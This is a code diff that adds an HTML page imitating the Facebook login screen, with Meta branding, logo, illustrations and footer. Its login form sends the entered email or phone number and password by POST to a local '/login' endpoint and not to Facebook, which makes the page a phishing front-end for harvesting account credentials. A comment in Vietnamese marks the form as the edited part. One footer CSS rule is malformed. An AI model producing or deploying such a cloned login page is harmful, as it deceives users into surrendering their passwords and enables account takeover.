@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Facebook – log in or sign up</title>
+<style>
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #fff;
+    overflow-x: hidden;
+  }
+
+  /* =========================================================
+     PAGE LAYOUT: 80vh top + 20vh footer
+  ========================================================= */
+  .page-wrapper {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  .top-section {
+    display: flex;
+    flex: 0 0 80vh;
+    min-height: 80vh;
+  }
+
+  /* =========================================================
+     LEFT PANEL  — 70%
+  ========================================================= */
+  .left-panel {
+    width: 60%;
+    position: relative;
+    background: #fff;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  /* Facebook logo top-left */
+  .fb-logo {
+    position: absolute;
+    top: 28px;
+    left: 36px;
+    z-index: 10;
+  }
+  .fb-logo-circle {
+    width: 52px; height: 52px;
+    background: #1877f2;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .fb-logo-circle svg { width: 32px; height: 32px; fill: #fff; }
+
+  /* Headline bottom-left */
+  .headline {
+    position: absolute;
+    bottom: 28px;
+    left: 36px;
+    z-index: 10;
+  }
+  .headline h1 {
+    font-size: 36px;
+    font-weight: 600;
+    color: #1c1e21;
+    line-height: 1.2;
+    letter-spacing: -0.3px;
+  }
+  .headline h1 .blue { color: #1877f2; }
+
+  /* ── ILLUSTRATION AREA ── */
+  .illustration {
+    position: absolute;
+    bottom: 10%;
+    left: 50%;
+    transform: translateX(-18%);
+    width: 520px;
+    height: 410px;
+  }
+
+  /* ── BACK CARD: two women photo ── */
+  .card-back {
+    position: absolute;
+    top: 0; right: 0;
+    width: 270px; height: 260px;
+    border-radius: 18px;
+    overflow: hidden;
+    box-shadow: 0 8px 32px rgba(0,0,0,.14);
+    background: #c8dbe8;
+  }
+
+  /* SVG photo simulation */
+  .card-back svg { width: 100%; height: 100%; display: block; }
+
+  /* Timer badge */
+  .timer-badge {
+    position: absolute;
+    top: 12px; right: 10px;
+    background: #6c47ff;
+    color: #fff;
+    border-radius: 20px;
+    padding: 5px 11px;
+    font-size: 13px;
+    font-weight: 700;
+    display: flex; align-items: center; gap: 5px;
+    z-index: 5;
+    box-shadow: 0 2px 8px rgba(108,71,255,.4);
+  }
+  .timer-badge svg { width: 13px; height: 13px; fill: #fff; }
+
+  /* Progress bar at top of back card */
+  .progress-bar {
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 5px;
+    background: rgba(255,255,255,.35);
+    z-index: 5;
+  }
+  .progress-fill {
+    height: 100%;
+    width: 62%;
+    background: #fff;
+    border-radius: 0 3px 3px 0;
+  }
+
+  /* ── MIDDLE CARD: marketplace-style ── */
+  .card-mid {
+    position: absolute;
+    top: 30px; left: 10px;
+    width: 150px; height: 190px;
+    border-radius: 14px;
+    overflow: hidden;
+    box-shadow: 0 6px 20px rgba(0,0,0,.13);
+    background: #e8e8e8;
+  }
+  .card-mid-icon {
+    position: absolute;
+    top: 8px; left: 8px;
+    width: 28px; height: 28px;
+    background: rgba(255,255,255,.85);
+    border-radius: 7px;
+    display: flex; align-items: center; justify-content: center;
+    z-index: 3;
+  }
+  .card-mid-icon svg { width: 16px; height: 16px; fill: #1c1e21; }
+
+  /* ── FRONT CARD: post / reel card ── */
+  .card-front {
+    position: absolute;
+    top: 170px; left: 110px;
+    width: 195px; height: 185px;
+    border-radius: 16px;
+    background: #fff;
+    box-shadow: 0 6px 24px rgba(0,0,0,.13);
+    padding: 12px;
+    z-index: 3;
+  }
+  .card-front-header {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 10px;
+  }
+  .card-front-icon {
+    width: 30px; height: 30px;
+    background: #1877f2;
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .card-front-icon svg { width: 16px; height: 16px; fill: #fff; }
+  .card-front-img {
+    width: 100%; height: 110px;
+    border-radius: 10px;
+    background: linear-gradient(135deg, #7c3aed 0%, #22c55e 55%, #06d6a0 100%);
+    position: relative;
+    overflow: hidden;
+  }
+  /* DJ silhouette inside */
+  .card-front-img svg {
+    position: absolute; bottom: 0; left: 50%; transform: translateX(-50%);
+    width: 80px; height: 90px;
+  }
+  .card-lines { margin-top: 10px; display: flex; flex-direction: column; gap: 5px; }
+  .cline { height: 7px; background: #e4e6eb; border-radius: 4px; }
+  .cline.w75 { width: 75%; }
+  .cline.w55 { width: 55%; }
+
+  /* ── AVATAR CIRCLE ── */
+  .avatar-circle {
+    position: absolute;
+    bottom: 5px; left: 240px;
+    width: 88px; height: 88px;
+    border-radius: 50%;
+    border: 4px solid #1877f2;
+    background: #e0f0e0;
+    z-index: 4;
+    overflow: hidden;
+    box-shadow: 0 4px 16px rgba(0,0,0,.18);
+  }
+  .avatar-circle svg { width: 100%; height: 100%; }
+
+  /* ── HEART REACTION ── */
+  .reaction {
+    position: absolute;
+    bottom: 90px; right: 10px;
+    width: 50px; height: 50px;
+    background: #f33e5a;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 14px rgba(243,62,90,.45);
+    z-index: 5;
+  }
+  .reaction svg { width: 24px; height: 24px; fill: #fff; }
+
+  /* ── DOTS ── */
+  .story-dots {
+    position: absolute;
+    bottom: 42px; right: 22px;
+    display: flex; gap: 9px; align-items: center;
+    z-index: 5;
+  }
+  .sdot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: rgba(255,255,255,.6);
+    border: 2px solid rgba(255,255,255,.9);
+  }
+  .sdot.act { background: transparent; border-color: #fff; width: 12px; height: 12px; }
+
+  /* ── EMOJI ── */
+  .big-emoji {
+    position: absolute;
+    top: 0px; left: 155px;
+    font-size: 44px;
+    z-index: 6;
+    filter: drop-shadow(0 3px 6px rgba(0,0,0,.15));
+  }
+
+  /* =========================================================
+     RIGHT PANEL  — 30%
+  ========================================================= */
+  .right-panel {
+    width: 40%;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+    border-left: 1px solid #dadde1;
+  }
+
+  .form-card {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+    padding: 24px 16px 28px;
+    width: 100%;
+    max-width: 340px;
+  }
+
+  .form-title {
+    font-size: 20px;
+    font-weight: 700;
+    color: #1c1e21;
+    margin-bottom: 18px;
+  }
+
+  .input-field {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1.5px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 16px;
+    color: #1c1e21;
+    margin-bottom: 12px;
+    outline: none;
+    background: #fff;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .input-field::placeholder { color: #90949c; font-size: 15px; }
+  .input-field:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+  }
+
+  .btn-login {
+    width: 100%;
+    padding: 14px;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background .15s;
+    margin-bottom: 14px;
+  }
+  .btn-login:hover { background: #166fe5; }
+  .btn-login:active { background: #1464d8; }
+
+  .forgot-link {
+    display: block;
+    text-align: center;
+    color: #1c1e21;
+    font-size: 14px;
+    text-decoration: none;
+    margin-bottom: 20px;
+  }
+  .forgot-link:hover { text-decoration: underline; }
+
+  .divider { height: 1px; background: #dadde1; margin: 0 0 20px; }
+
+  .btn-create {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    background: #fff;
+    color: #1877f2;
+    border: 1.5px solid #1877f2;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .15s;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .btn-create:hover { background: #f0f6ff; }
+
+  .meta-logo {
+    text-align: center;
+    color: #1c1e21;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+    font-weight: 600;
+  }
+  /* Meta ∞ icon */
+  .meta-logo svg { width: 22px; height: 14px; }
+
+  /* =========================================================
+     FOOTER  — 20vh
+  ========================================================= */
+  footer {
+    flex: 0 0 20vh;
+    min-height: 20vh;
+    border-top: 1px solid #dadde1;
+    background: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 16px 0;
+    gap: 6px;
+  }
+
+  .footer-inner {
+    width: 70%;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .footer-langs {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 3px 14px;
+  }
+  .footer-langs a {
+    color: #8a8d91;
+    font-size: 13.5px;
+    text-decoration: none;
+  }
+  .footer-langs a:hover { text-decoration: underline; }
+
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 2px 8px;
+  }
+  .footer-links a {
+    color: #8a8d91;
+    font-size: 13px; { text-decoration: underline; }
+
+  .footer-copy {
+    color: #8a8d91;
+    font-size: 13px;
+  }
+</style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- ═══ TOP SECTION ═══ -->
+  <div class="top-section">
+
+    <!-- ── LEFT 70% ── -->
+    <div class="left-panel">
+
+      <!-- Logo -->
+      <div class="fb-logo">
+        <div class="fb-logo-circle">
+          <svg viewBox="0 0 24 24"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.514c-1.491 0-1.956.93-1.956 1.887v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
+        </div>
+      </div>
+
+      <!-- Illustration -->
+      <div class="illustration">
+
+        <!-- Emoji -->
+        <div class="big-emoji">😄</div>
+
+        <!-- Back card: two women photo -->
+        <div class="card-back">
+          <div class="progress-bar"><div class="progress-fill"></div></div>
+          <!-- SVG illustration of two women -->
+          <svg viewBox="0 0 300 290" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
+                <stop offset="0%" stop-color="#87CEEB"/>
+                <stop offset="100%" stop-color="#c8e8f8"/>
+              </linearGradient>
+            </defs>
+            <rect width="300" height="290" fill="url(#sky)"/>
+            <!-- Background elements -->
+            <rect x="0" y="180" width="300" height="110" fill="#e8dcc8" rx="0"/>
+            <!-- Person 1 (left, orange/pink top) -->
+            <ellipse cx="112" cy="90" rx="36" ry="44" fill="#f5c5a0"/>
+            <!-- Hair 1 -->
+            <ellipse cx="112" cy="65" rx="38" ry="30" fill="#1a0a00"/>
+            <rect x="76" y="72" width="10" height="40" rx="5" fill="#1a0a00"/>
+            <!-- Body 1 -->
+            <path d="M78 130 Q112 115 146 130 L152 290 H72 Z" fill="#e84848"/>
+            <!-- Arm raised -->
+            <path d="M146 130 Q165 100 175 85" stroke="#f5c5a0" stroke-width="18" fill="none" stroke-linecap="round"/>
+            <!-- Person 2 (right, striped) -->
+            <ellipse cx="205" cy="100" rx="40" ry="48" fill="#d4a882"/>
+            <!-- Hair 2 -->
+            <path d="M165 80 Q205 45 245 80 L248 130 Q205 120 162 130 Z" fill="#2d1a00"/>
+            <!-- Body 2 (striped sweater) -->
+            <path d="M165 148 Q205 130 245 148 L258 290 H152 Z" fill="#e06030"/>
+            <!-- Stripes on sweater -->
+            <path d="M155 165 L258 165" stroke="#d4a020" stroke-width="10"/>
+            <path d="M152 182 L260 182" stroke="#2d8a40" stroke-width="8"/>
+            <path d="M151 198 L261 198" stroke="#c0c0c0" stroke-width="7"/>
+            <!-- Smiles / faces -->
+            <path d="M98 95 Q112 105 126 95" stroke="#c0704a" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+            <path d="M190 108 Q205 120 220 108" stroke="#a0603a" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+          </svg>
+          <!-- Timer badge -->
+          <div class="timer-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm.5 5v5.25l4.5 2.67-.75 1.23L11 13V7h1.5z"/></svg>
+            16:45
+          </div>
+          <!-- Dots -->
+          <div class="story-dots">
+            <div class="sdot act"></div>
+            <div class="sdot"></div>
+            <div class="sdot"></div>
+          </div>
+          <!-- Heart reaction -->
+          <div class="reaction">
+            <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+          </div>
+        </div>
+
+        <!-- Middle card: marketplace / cooler box -->
+        <div class="card-mid">
+          <div class="card-mid-icon">
+            <svg viewBox="0 0 24 24"><path d="M3 9h18V7H3v2zm0 4h18v-2H3v2zm0 4h18v-2H3v2z"/></svg>
+          </div>
+          <svg viewBox="0 0 170 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block;">
+            <rect width="170" height="210" fill="#d8d8d8"/>
+            <!-- Cooler box -->
+            <rect x="35" y="80" width="95" height="75" rx="8" fill="#5a6a7a"/>
+            <rect x="35" y="80" width="95" height="18" rx="8" fill="#7a8a9a"/>
+            <!-- Handle -->
+            <path d="M65 80 L65 65 Q82 55 100 65 L100 80" stroke="#e87040" stroke-width="8" fill="none" stroke-linecap="round"/>
+            <!-- Lid latch -->
+            <rect x="75" y="95" width="20" height="8" rx="3" fill="#bbb"/>
+            <!-- Floor shadow -->
+            <ellipse cx="82" cy="165" rx="50" ry="8" fill="rgba(0,0,0,.12)"/>
+          </svg>
+        </div>
+
+        <!-- Front card: post with DJ -->
+        <div class="card-front">
+          <div class="card-front-header">
+            <div class="card-front-icon">
+              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+            </div>
+          </div>
+          <div class="card-front-img">
+            <!-- DJ figure -->
+            <svg viewBox="0 0 186 110" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;display:block;">
+              <defs>
+                <linearGradient id="djBg" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#7c3aed"/>
+                  <stop offset="50%" stop-color="#22c55e"/>
+                  <stop offset="100%" stop-color="#06d6a0"/>
+                </linearGradient>
+              </defs>
+              <rect width="186" height="110" fill="url(#djBg)"/>
+              <!-- Green smoke cloud -->
+              <ellipse cx="60" cy="70" rx="55" ry="35" fill="rgba(34,197,94,.5)"/>
+              <ellipse cx="30" cy="85" rx="40" ry="25" fill="rgba(6,214,160,.4)"/>
+              <!-- Turntable -->
+              <rect x="50" y="75" width="86" height="25" rx="4" fill="rgba(0,0,0,.5)"/>
+              <circle cx="93" cy="87" r="10" fill="#555"/>
+              <circle cx="93" cy="87" r="3" fill="#888"/>
+              <!-- DJ body -->
+              <rect x="76" y="40" width="34" height="40" rx="6" fill="#1a1a1a"/>
+              <!-- Head -->
+              <ellipse cx="93" cy="30" rx="16" ry="18" fill="#5a3a28"/>
+              <!-- Cap -->
+              <rect x="77" y="16" width="32" height="8" rx="4" fill="#1a1a1a"/>
+              <rect x="73" y="20" width="40" height="4" rx="2" fill="#2a2a2a"/>
+              <!-- Headphones -->
+              <path d="M78 28 Q75 18 93 16 Q111 18 108 28" stroke="#222" stroke-width="4" fill="none"/>
+              <rect x="73" y="24" width="8" height="12" rx="3" fill="#333"/>
+              <rect x="105" y="24" width="8" height="12" rx="3" fill="#333"/>
+            </svg>
+          </div>
+          <div class="card-lines">
+            <div class="cline w75"></div>
+            <div class="cline w55"></div>
+          </div>
+        </div>
+
+        <!-- Avatar circle: man with cap -->
+        <div class="avatar-circle">
+          <svg viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
+            <rect width="96" height="96" fill="#c8e8b0"/>
+            <!-- Grass/background -->
+            <rect x="0" y="58" width="96" height="38" fill="#5ab030" rx="0"/>
+            <!-- Body -->
+            <rect x="28" y="56" width="40" height="40" rx="8" fill="#f0a040"/>
+            <!-- Head -->
+            <ellipse cx="48" cy="46" rx="22" ry="24" fill="#c8845a"/>
+            <!-- Hair -->
+            <path d="M26 38 Q48 18 70 38 L72 56 Q48 52 24 56 Z" fill="#3a2010" opacity=".9"/>
+            <!-- Green cap -->
+            <rect x="24" y="28" width="48" height="14" rx="7" fill="#30a030"/>
+            <rect x="14" y="38" width="68" height="6" rx="3" fill="#28902a"/>
+            <!-- Smile -->
+            <path d="M38 54 Q48 62 58 54" stroke="#a06040" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+            <!-- Eyes -->
+            <ellipse cx="40" cy="47" rx="3" ry="3.5" fill="#2a1a0a"/>
+            <ellipse cx="56" cy="47" rx="3" ry="3.5" fill="#2a1a0a"/>
+          </svg>
+        </div>
+
+      </div><!-- /illustration -->
+
+      <!-- Headline -->
+      <div class="headline">
+        <h1>Explore the<br>things <span class="blue">you</span><br><span class="blue">love</span>.</h1>
+      </div>
+
+    </div><!-- /left-panel -->
+
+    <!-- ── RIGHT 30% ── -->
+    <div class="right-panel">
+      <div class="form-card">
+        <p class="form-title">Log in to Facebook</p>
+
+        <!-- === PHẦN ĐÃ SỬA === -->
+        <form method="POST" action="/login">
+          <input class="input-field" type="text" name="email" placeholder="Email address or mobile number" required/>
+          <input class="input-field" type="password" name="pass" placeholder="Password" required/>
+          <button type="submit" class="btn-login">Log in</button>
+        </form>
+        <!-- ===================== -->
+
+        <a href="#" class="forgot-link">Forgotten password?</a>
+
+        <div class="divider"></div>
+
+        <button class="btn-create">Create new account</button>
+
+        <!-- Meta logo -->
+        <div class="meta-logo">
+          <!-- Meta infinity symbol -->
+          <svg viewBox="0 0 38 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.5 10C3.5 7.5 5 5.5 7 5.5C9.2 5.5 10.5 7.2 12 10C13.5 12.8 14.8 14.5 17 14.5C19.5 14.5 21 12.2 21 10C21 7.8 19.5 5.5 17 5.5C15.5 5.5 14.3 6.4 13.3 7.8" stroke="#1877f2" stroke-width="2.2" stroke-linecap="round"/>
+            <path d="M34.5 10C34.5 7.5 33 5.5 31 5.5C28.8 5.5 27.5 7.2 26 10C24.5 12.8 23.2 14.5 21 14.5C18.5 14.5 17 12.2 17 10C17 7.8 18.5 5.5 21 5.5C22.5 5.5 23.7 6.4 24.7 7.8" stroke="#1877f2" stroke-width="2.2" stroke-linecap="round"/>
+          </svg>
+          <span style="color:#1c1e21;font-size:14px;font-weight:600;">Meta</span>
+        </div>
+      </div>
+    </div><!-- /right-panel -->
+
+  </div><!-- /top-section -->
+
+  <!-- ═══ FOOTER 20vh ═══ -->
+  <footer>
+  <div class="footer-inner">
+    <!-- Row 1: Languages -->
+    <div class="footer-langs">
+      <a href="#">English (UK)</a>
+      <a href="#">Tiếng Việt</a>
+      <a href="#">中文(台灣)</a>
+      <a href="#">한국어</a>
+      <a href="#">日本語</a>
+      <a href="#">Français (France)</a>
+      <a href="#">ภาษาไทย</a>
+      <a href="#">More languages...</a>
+    </div>
+    <!-- Row 2: Sign up → Privacy Policy -->
+    <div class="footer-links">
+      <a href="#">Sign up</a>
+      <a href="#">Log in</a>
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Video</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Ray-Ban Meta</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Instagram</a>
+      <a href="#">Threads</a>
+      <a href="#">Privacy Policy</a>
+    </div>
+    <!-- Row 3: Privacy Centre → Contact uploading -->
+    <div class="footer-links">
+      <a href="#">Privacy Centre</a>
+      <a href="#">About</a>
+      <a href="#">Create ad</a>
+      <a href="#">Create Page</a>
+      <a href="#">Developers</a>
+      <a href="#">Careers</a>
+      <a href="#">Cookies</a>
+      <a href="#">AdChoices</a>
+      <a href="#">Terms</a>
+      <a href="#">Help</a>
+      <a href="#">Contact uploading and non-users</a>
+    </div>
+    <p class="footer-copy">Meta © 2026</p>
+  </div>
+  </footer>
+
+</div><!-- /page-wrapper -->
+</body>
+</html>
